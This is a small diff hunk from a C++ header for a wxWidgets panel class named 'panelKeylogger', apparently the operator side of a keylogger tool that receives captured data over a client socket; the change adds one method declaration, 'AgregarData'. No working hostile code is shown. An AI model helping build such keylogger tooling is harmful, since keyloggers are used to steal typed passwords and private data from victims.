@@ -10,6 +10,8 @@ class panelKeylogger : public wxPanel {
 		wxTextCtrl* txt_Data = nullptr;
 		SOCKET sckCliente = INVALID_SOCKET;
 
+		void AgregarData(const char*& pBuffer);
+
 	private:
 
 		void OnToggle(wxCommandEvent& event); 
